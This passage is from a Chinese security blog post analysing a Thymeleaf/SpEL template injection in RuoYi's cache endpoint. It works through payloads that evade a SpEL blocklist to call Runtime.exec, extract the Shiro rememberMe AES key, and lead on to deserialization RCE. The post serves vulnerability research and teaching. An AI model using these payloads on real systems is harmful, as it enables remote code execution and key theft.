-</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">getCacheNames</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">fragment</span><span class="p">,</span><span class="w"> </span><span class="n">ModelMap</span><span class="w"> </span><span class="n">mmap</span><span class="p">)</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">{</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">mmap</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;cacheNames&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">cacheService</span><span class="p">.</span><span class="na">getCacheNames</span><span class="p">());</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">prefix</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;/cache::&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">fragment</span><span class="p">;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span></span></span></code></pre></td></tr></table>
-</div>
-</div></div>
-</div><p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603071144220.png" style="max-width: 100%; height: auto;"></p>
-<p>用户在 <!-- raw HTML omitted -->http://localhost:80/monitor/cache/getNames 接口处 POST 传入的 <!-- raw HTML omitted --><code>&lt;font style=&quot;color:#080808;background-color:#ffffff;&quot;&gt;fragment&lt;/font&gt;</code><!-- raw HTML omitted --> 参数，被直接拼接到 Thymeleaf 模板路径中，<!-- raw HTML omitted --><code>&lt;font style=&quot;color:#080808;background-color:#ffffff;&quot;&gt;return&lt;/font&gt;</code><!-- raw HTML omitted -->返回结果使用 Thymeleaf 片段语法(::)拼接<!-- raw HTML omitted --></p>
-<blockquote>
-<p>Thymeleaf片段语法格式为：<code>前缀 + &quot;/cache::&quot; + 片段名</code></p>
-</blockquote>
-<div class="code-block-container" id="code-1772962473821015900" data-expanded="false" role="region" aria-labelledby="btn-code-1772962473821015900">
-    <div class="code-header">
-        <div class="mac-buttons">
-            <span class="mac-button red"></span>
-            <span class="mac-button yellow"></span>
-            <span class="mac-button green"></span>
-        </div>
-        <span class="code-language">java</span>
-        <div class="code-actions">
-            <button class="copy-btn" title="Copy" aria-label="复制代码">
-                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
-            </button>
-            <button class="toggle-btn" id="btn-code-1772962473821015900" title="Toggle" aria-expanded="false" aria-controls="code-1772962473821015900" aria-label="展开或折叠代码块">
-                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
-            </button>
-        </div>
-    </div>
-    <div class="code-content" id="code-1772962473821015900-content"><div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks">1</span>
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="k">return</span><span class="w"> </span><span class="n">prefix</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;/cache::&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">fragment</span><span class="p">;</span></span></span></code></pre></td></tr></table>
-</div>
-</div></div>
-</div><p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603071144449.png" style="max-width: 100%; height: auto;"></p>
-<p>攻击者通过 fragment 参数注入 SpEL 表达式，Thymeleaf 在解析视图名时会自动执行</p>
-<p><!-- raw HTML omitted -->通过<!-- raw HTML omitted --><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);&quot;&gt;__|$${表达式}|__::.x&lt;/font&gt;</code><!-- raw HTML omitted --> 该格式可进行绕过，先来试验一下：<!-- raw HTML omitted --></p>
-<div class="code-block-container" id="code-1772962473827374500" data-expanded="false" role="region" aria-labelledby="btn-code-1772962473827374500">
-    <div class="code-header">
-        <div class="mac-buttons">
-            <span class="mac-button red"></span>
-            <span class="mac-button yellow"></span>
-            <span class="mac-button green"></span>
-        </div>
-        <span class="code-language">plain</span>
-        <div class="code-actions">
-            <button class="copy-btn" title="Copy" aria-label="复制代码">
-                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
-            </button>
-            <button class="toggle-btn" id="btn-code-1772962473827374500" title="Toggle" aria-expanded="false" aria-controls="code-1772962473827374500" aria-label="展开或折叠代码块">
-                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
-            </button>
-        </div>
-    </div>
-    <div class="code-content" id="code-1772962473827374500-content"><div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks">1</span>
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">fragment=__|$${#response.getWriter().print(&#39;111&#39;)}|__::.x</span></span></code></pre></td></tr></table>
-</div>
-</div></div>
-</div><p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603071145609.png" style="max-width: 100%; height: auto;"></p>
-<p><strong>关于 payload 的构造可以看 <strong><a href="https://mp.weixin.qq.com/s/4yi0UOTgBCsGK6J8qSz8tQ"><strong>https://mp.weixin.qq.com/s/4yi0UOTgBCsGK6J8qSz8tQ</strong></a></strong> 这篇文章，讲解十分详细</strong></p>
-<blockquote>
-<p><strong><!-- raw HTML omitted -->最新版本中禁用的语法<!-- raw HTML omitted --></strong><!-- raw HTML omitted -->：<!-- raw HTML omitted --></p>
-<ul>
-<li><!-- raw HTML omitted -->❌<!-- raw HTML omitted --><!-- raw HTML omitted --> <!-- raw HTML omitted --><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);&quot;&gt;T(java.lang.Runtime)&lt;/font&gt;</code><!-- raw HTML omitted -->（类型引用）<!-- raw HTML omitted --></li>
-<li><!-- raw HTML omitted -->❌<!-- raw HTML omitted --><!-- raw HTML omitted --> <!-- raw HTML omitted --><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);&quot;&gt;new java.io.File()&lt;/font&gt;</code><!-- raw HTML omitted -->（对象实例化）<!-- raw HTML omitted --></li>
-<li><!-- raw HTML omitted -->❌<!-- raw HTML omitted --><!-- raw HTML omitted --> <!-- raw HTML omitted --><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);&quot;&gt;T ()&lt;/font&gt;</code><!-- raw HTML omitted -->（带空格的类型引用）<!-- raw HTML omitted --></li>
-<li><!-- raw HTML omitted -->❌<!-- raw HTML omitted --><!-- raw HTML omitted --> <!-- raw HTML omitted --><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);&quot;&gt;param&lt;/font&gt;</code><!-- raw HTML omitted -->（参数引用）<!-- raw HTML omitted --></li>
-</ul>
-<p><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
-<p><!-- raw HTML omitted -->通过链式调用是可以成功执行的，因此表达式格式可以使用方法链式调用。之前的利用链不可用，经过查找，发现可以在<!-- raw HTML omitted --><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);&quot;&gt;SecurityManager&lt;/font&gt;</code><!-- raw HTML omitted --> 中获取 getRuntime 方法，根据之前payload的调用方法，构造出以下利用链:<!-- raw HTML omitted --></p>
-</blockquote>
-<p><!-- raw HTML omitted -->获取SecurityManager → 获取Class → 获取ClassLoader → 加载Runtime类 → 获取getRuntime方法 → 获取Runtime实例 → 获取exec方法 → 执行系统命令<!-- raw HTML omitted --></p>
-<p><!-- raw HTML omitted -->那么构造出如下利用链：<!-- raw HTML omitted --></p>
-<div class="code-block-container" id="code-1772962473827374500" data-expanded="false" role="region" aria-labelledby="btn-code-1772962473827374500">
-    <div class="code-header">
-        <div class="mac-buttons">
-            <span class="mac-button red"></span>
-            <span class="mac-button yellow"></span>
-            <span class="mac-button green"></span>
-        </div>
-        <span class="code-language">plain</span>
-        <div class="code-actions">
-            <button class="copy-btn" title="Copy" aria-label="复制代码">
-                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
-            </button>
-            <button class="toggle-btn" id="btn-code-1772962473827374500" title="Toggle" aria-expanded="false" aria-controls="code-1772962473827374500" aria-label="展开或折叠代码块">
-                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
-            </button>
-        </div>
-    </div>
-    <div class="code-content" id="code-1772962473827374500-content"><div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks">1</span>
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">fragment=__|$${#response.getWriter().print(@securityManager.getClass().getClassLoader().loadClass(&#39;java.lang.Runtime&#39;).getMethods().?[name==&#39;getRuntime&#39;][0].invoke(null).exec(&#39;calc&#39;))}|__::.x</span></span></code></pre></td></tr></table>
-</div>
-</div></div>
-</div><p><!-- raw HTML omitted -->直接500报错，那么为什么这个链看起来是正常的却不能执行？<!-- raw HTML omitted --></p>
-<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603071144224.png" style="max-width: 100%; height: auto;"><!-- raw HTML omitted --><br>
-<!-- raw HTML omitted --><!-- raw HTML omitted -->先一步一步来，一点一点删除调用的方法，直到删除到<!-- raw HTML omitted --><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);&quot;&gt;loadClass('java.lang.Runtime')&lt;/font&gt;</code><!-- raw HTML omitted --> 这个地方成功输出。<!-- raw HTML omitted --></p>
-<div class="code-block-container" id="code-1772962473827374500" data-expanded="false" role="region" aria-labelledby="btn-code-1772962473827374500">
-    <div class="code-header">
-        <div class="mac-buttons">
-            <span class="mac-button red"></span>
-            <span class="mac-button yellow"></span>
-            <span class="mac-button green"></span>
-        </div>
-        <span class="code-language">plain</span>
-        <div class="code-actions">
-            <button class="copy-btn" title="Copy" aria-label="复制代码">
-                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
-            </button>
-            <button class="toggle-btn" id="btn-code-1772962473827374500" title="Toggle" aria-expanded="false" aria-controls="code-1772962473827374500" aria-label="展开或折叠代码块">
-                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
-            </button>
-        </div>
-    </div>
-    <div class="code-content" id="code-1772962473827374500-content"><div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks">1</span>
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">fragment=__|$${#response.getWriter().print(@securityManager.getClass().getClassLoader().loadClass(&#39;java.lang.Runtime&#39;))}|__::.x</span></span></code></pre></td></tr></table>
-</div>
-</div></div>
-</div><p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603071144328.png" style="max-width: 100%; height: auto;"></p>
-<p><!-- raw HTML omitted -->看来是有某个安全监测机制不让获取getRuntime方法，那么还有机会能绕过吗？有的。在 SpEL 中，对于无参数的方法调用，括号 () 是可选的，<!-- raw HTML omitted --><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);&quot;&gt;getMethods()&lt;/font&gt;</code><!-- raw HTML omitted -->和<!-- raw HTML omitted --><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);&quot;&gt;getMethods&lt;/font&gt;</code><!-- raw HTML omitted -->作用是一样的，那么试一下把括号去掉是否报错。没有报错，成功获取到getRuntime方法<!-- raw HTML omitted --></p>
-<div class="code-block-container" id="code-1772962473827891300" data-expanded="false" role="region" aria-labelledby="btn-code-1772962473827891300">
-    <div class="code-header">
-        <div class="mac-buttons">
-            <span class="mac-button red"></span>
-            <span class="mac-button yellow"></span>
-            <span class="mac-button green"></span>
-        </div>
-        <span class="code-language">plain</span>
-        <div class="code-actions">
-            <button class="copy-btn" title="Copy" aria-label="复制代码">
-                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
-            </button>
-            <button class="toggle-btn" id="btn-code-1772962473827891300" title="Toggle" aria-expanded="false" aria-controls="code-1772962473827891300" aria-label="展开或折叠代码块">
-                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
-            </button>
-        </div>
-    </div>
-    <div class="code-content" id="code-1772962473827891300-content"><div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks">1</span>
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">fragment=__|$${#response.getWriter().print(@securityManager.getClass().getClassLoader().loadClass(&#39;java.lang.Runtime&#39;).getMethods.?[name==&#39;getRuntime&#39;][0])}|__::.x</span></span></code></pre></td></tr></table>
-</div>
-</div></div>
-</div><p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603071145751.png" style="max-width: 100%; height: auto;"></p>
-<p><!-- raw HTML omitted -->那现在继续调试上面完整的利用链。现在只获取到了方法，但是没反射调用，<!-- raw HTML omitted --></p>
-<div class="code-block-container" id="code-1772962473828409200" data-expanded="false" role="region" aria-labelledby="btn-code-1772962473828409200">
-    <div class="code-header">
-        <div class="mac-buttons">
-            <span class="mac-button red"></span>
-            <span class="mac-button yellow"></span>
-            <span class="mac-button green"></span>
-        </div>
-        <span class="code-language">plain</span>
-        <div class="code-actions">
-            <button class="copy-btn" title="Copy" aria-label="复制代码">
-                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
-            </button>
-            <button class="toggle-btn" id="btn-code-1772962473828409200" title="Toggle" aria-expanded="false" aria-controls="code-1772962473828409200" aria-label="展开或折叠代码块">
-                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
-            </button>
-        </div>
-    </div>
-    <div class="code-content" id="code-1772962473828409200-content"><div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks">1</span>
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">fragment=__|$${#response.getWriter().print(@securityManager.getClass().getClassLoader().loadClass(&#39;java.lang.Runtime&#39;).getMethods.?[name==&#39;getRuntime&#39;][0].invoke(null).getClass.getMethods.?[name==&#39;exec&#39;][0])}|__::.x</span></span></code></pre></td></tr></table>
-</div>
-</div></div>
-</div><p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603071144439.png" style="max-width: 100%; height: auto;"></p>
-<p><!-- raw HTML omitted -->由于获取到的是第一个exec方法，在查找当前exec方法的用法后，构造以下利用链：<!-- raw HTML omitted --></p>
-<div class="code-block-container" id="code-1772962473828409200" data-expanded="false" role="region" aria-labelledby="btn-code-1772962473828409200">
-    <div class="code-header">
-        <div class="mac-buttons">
-            <span class="mac-button red"></span>
-            <span class="mac-button yellow"></span>
-            <span class="mac-button green"></span>
-        </div>
-        <span class="code-language">plain</span>
-        <div class="code-actions">
-            <button class="copy-btn" title="Copy" aria-label="复制代码">
-                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
-            </button>
-            <button class="toggle-btn" id="btn-code-1772962473828409200" title="Toggle" aria-expanded="false" aria-controls="code-1772962473828409200" aria-label="展开或折叠代码块">
-                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
-            </button>
-        </div>
-    </div>
-    <div class="code-content" id="code-1772962473828409200-content"><div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks">1</span>
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">fragment=__|$${#response.getWriter().print(@securityManager.getClass().getClassLoader().loadClass(&#39;java.lang.Runtime&#39;).getMethods.?[name==&#39;getRuntime&#39;][0].invoke(null).getClass.getMethods.?[name==&#39;exec&#39;][0].invoke(@securityManager.getClass().getClassLoader().loadClass(&#39;java.lang.Runtime&#39;).getMethods.?[name==&#39;getRuntime&#39;][0].invoke(null),&#39;calc&#39;,null))}|__::.x</span></span></code></pre></td></tr></table>
-</div>
-</div></div>
-</div><p><!-- raw HTML omitted -->等价于<!-- raw HTML omitted --><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);&quot;&gt;Runtime.exec(Runtime.getRuntime,&quot;calc&quot;);&lt;/font&gt;</code><!-- raw HTML omitted -->,意思就是执行 <!-- raw HTML omitted --><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);&quot;&gt;Runtime.getRuntime&lt;/font&gt;</code><!-- raw HTML omitted --> 中的 <!-- raw HTML omitted --><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);&quot;&gt;exec&lt;/font&gt;</code><!-- raw HTML omitted -->方法<!-- raw HTML omitted --></p>
-<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603071144493.png" style="max-width: 100%; height: auto;"></p>
-<h2 id="payload-解析">Payload 解析<a hidden class="anchor" aria-hidden="true" href="#payload-解析">#</a></h2>
-<p><code>fragment=__|$${#response.getWriter().print(''.getClass().forName('java.util.Base64').getMethod('getEncoder').invoke(null).encodeToString(@securityManager.rememberMeManager.cipherKey))}|__::.x</code></p>
-<p>拼接后完整视图名变为：<code>monitor/cache/cache::__|${...SpEL...}|__::.x</code></p>
-<p><strong>第一层：</strong><code>__|${...SpEL表达式...}|__::.x</code></p>
-<p>Thymeleaf 预处理标记，<code>__...__</code> 之间的内容会在视图解析之前先被预处理执行</p>
-<p><code>|...|</code> 是 Thymeleaf 的字面量替换语法，<code>${...}</code> 内部为 SpEL 表达式</p>
-<p>伪造一个不存在的片段名 <code>.x</code>，使其符合 <code>模板::片段</code> 的语法格式，否则解析会报错</p>
-<p><strong>第二层：</strong><code>#response.getWriter().print(...)</code></p>
-<p><code> #response</code>    Thymeleaf 上下文中内置的 HttpServletResponse 对象</p>
-<p><code> .getWriter()</code> 获取响应的 PrintWriter，可以直接向 HTTP 响应体写内容</p>
-<p><code>.print(...)</code>  将结果直接写入 HTTP 响应，攻击者在响应中就能看到输出</p>
-<p>**第三层： **<code>@securityManager.rememberMeManager.cipherKey</code></p>
-<p><code>@securityManager</code>   SpEL 的 @beanName 语法，从 Spring 容器中按名称获取 Bean。RuoYi 使用 Shiro，会注册一个名为 securityManager 的 Bean</p>
-<p><code>.rememberMeManager</code>   获取 Shiro SecurityManager 中的 RememberMe 管理器（CookieRememberMeManager）</p>
-<p><code>.cipherKey</code>   获取 RememberMe 功能使用的 AES 加密密钥（byte[] 类型）</p>
-<p><strong>第四层：</strong></p>
-<p>因为 cipherKey 是 byte[]，直接 print 会乱码，所以需要 Base64 编码：</p>
-<div class="code-block-container" id="code-1772962473829052800" data-expanded="false" role="region" aria-labelledby="btn-code-1772962473829052800">
-    <div class="code-header">
-        <div class="mac-buttons">
-            <span class="mac-button red"></span>
-            <span class="mac-button yellow"></span>
-            <span class="mac-button green"></span>
-        </div>
-        <span class="code-language">java</span>
-        <div class="code-actions">
-            <button class="copy-btn" title="Copy" aria-label="复制代码">
-                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
-            </button>
-            <button class="toggle-btn" id="btn-code-1772962473829052800" title="Toggle" aria-expanded="false" aria-controls="code-1772962473829052800" aria-label="展开或折叠代码块">
-                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
-            </button>
-        </div>
-    </div>
-    <div class="code-content" id="code-1772962473829052800-content"><div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks">1</span>
-</span><span class="lnt" id="2"><span class="lnlinks">2</span>
-</span><span class="lnt" id="3"><span class="lnlinks">3</span>
-</span><span class="lnt" id="4"><span class="lnlinks">4</span>
-</span><span class="lnt" id="5"><span class="lnlinks">5</span>
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="err">&#39;&#39;</span><span class="p">.</span><span class="na">getClass</span><span class="p">()</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="err">&#39;</span><span class="n">java</span><span class="p">.</span><span class="na">util</span><span class="p">.</span><span class="na">Base64</span><span class="err">&#39;</span><span class="p">)</span><span class="w">       </span><span class="c1">// 反射加载 Base64 类</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">.</span><span class="na">getMethod</span><span class="p">(</span><span class="err">&#39;</span><span class="n">getEncoder</span><span class="err">&#39;</span><span class="p">)</span><span class="w">           </span><span class="c1">// 获取静态方法 getEncoder()</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="kc">null</span><span class="p">)</span><span class="w">                      </span><span class="c1">// 调用静态方法，返回 Base64.Encoder</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">.</span><span class="na">encodeToString</span><span class="p">(</span><span class="n">cipherKey</span><span class="p">)</span><span class="w">         </span><span class="o">//</span><span class="w"> </span><span class="n">将</span><span class="w"> </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">编码为可读字符串</span></span></span></code></pre></td></tr></table>
-</div>
-</div></div>
-</div><h2 id="漏洞链泄露-shiro-key--反序列化-rce">漏洞链：泄露 Shiro Key → 反序列化 RCE<a hidden class="anchor" aria-hidden="true" href="#漏洞链泄露-shiro-key--反序列化-rce">#</a></h2>
-<p>泄露的密钥是 Shiro RememberMe Cookie 的 AES 加密密钥。攻击者拿到此密钥后：</p>
-<p>使用 ysoserial 等工具生成恶意 Java 反序列化 payload</p>
-<p>用泄露的 AES Key 加密该 payload</p>
-<p>作为 rememberMe Cookie 发送</p>
-<p>Shiro 解密 → 反序列化 → 远程代码执行（RCE）</p>
-
-
-  </div>
-
-  <footer class="post-footer">
-    <ul class="post-tags">
-    </ul>
-<nav class="paginav">
-  <a class="prev" href="http://localhost:55722/xvsf/posts/%E6%A2%A6%E4%B9%8B%E5%85%89%E8%8A%92%E7%9A%84%E5%B0%8F%E6%B8%B8%E6%88%8F/">
-    <span class="title">« Prev</span>
-    <br>
-    <span>梦之光芒的小游戏</span>
-  </a>
-  <a class="next" href="http://localhost:55722/xvsf/posts/cve-2022-22947spring-cloud-gateway-%E5%AD%A6%E4%B9%A0--spel-%E7%9A%84%E5%A4%9A%E7%A7%8D%E6%B3%A8%E5%85%A5/">
-    <span class="title">Next »</span>
-    <br>
-    <span>CVE-2022-22947——Spring Cloud Gateway 学习 &amp; SpEL 的多种注入</span>
-  </a>
-</nav>
-
-  </footer><div class="giscus"></div>
-<script>
-(function() {
-    function getGiscusTheme() {
-        var t = document.documentElement.getAttribute('data-theme');
-        return t === 'dark' ? 'dark_protanopia' : 'light_protanopia';
-    }
-    var s = document.createElement('script');
-    s.src = 'https://giscus.app/client.js';
-    s.setAttribute('data-repo', 'XVSHIFU/xvsf');
-    s.setAttribute('data-repo-id', 'R_kgDOQ6WxXQ');
-    s.setAttribute('data-category', 'Announcements');
-    s.setAttribute('data-category-id', 'DIC_kwDOQ6WxXc4C1A4B');
-    s.setAttribute('data-mapping', 'pathname');
-    s.setAttribute('data-strict', '0');
-    s.setAttribute('data-reactions-enabled', '1');
-    s.setAttribute('data-emit-metadata', '0');
-    s.setAttribute('data-input-position', 'top');
-    s.setAttribute('data-theme', getGiscusTheme());
-    s.setAttribute('data-lang', 'zh-CN');
-    s.setAttribute('data-loading', 'lazy');
-    s.crossOrigin = 'anonymous';
-    s.async = true;
-    document.querySelector('.giscus').appendChild(s);
-})();
-</script>
-</article>
-    </main>
-    
-<footer class="footer">
-        <span>&copy; 2026 <a href="http://localhost:55722/xvsf/">xvsf</a></span> · 
-
-    <span>
-        Powered by
-        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
-        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
-    </span>
-</footer>
-<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
-    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
-        <path d="M12 6H0l6-6z" />
-    </svg>
-</a>
-
-
-<script>
-document.addEventListener('DOMContentLoaded', function() {
-    
-    document.querySelectorAll('.code-header').forEach(header => {
-        header.addEventListener('click', (e) => {
-            
-            if (e.target.closest('.copy-btn')) return;
-            
-            if (e.target.closest('.toggle-btn')) return;
-            const container = header.parentElement;
-            const isExpanded = container.getAttribute('data-expanded') === 'true';
-            const next = !isExpanded;
-            container.setAttribute('data-expanded', next);
-            container.setAttribute('aria-expanded', next);
-            const toggle = container.querySelector('.toggle-btn');
-            if (toggle) toggle.setAttribute('aria-expanded', String(next));
-        });
-    });
-
-    
-    document.querySelectorAll('.code-block-container .toggle-btn').forEach(btn => {
-        btn.addEventListener('click', (e) => {
-            e.stopPropagation();
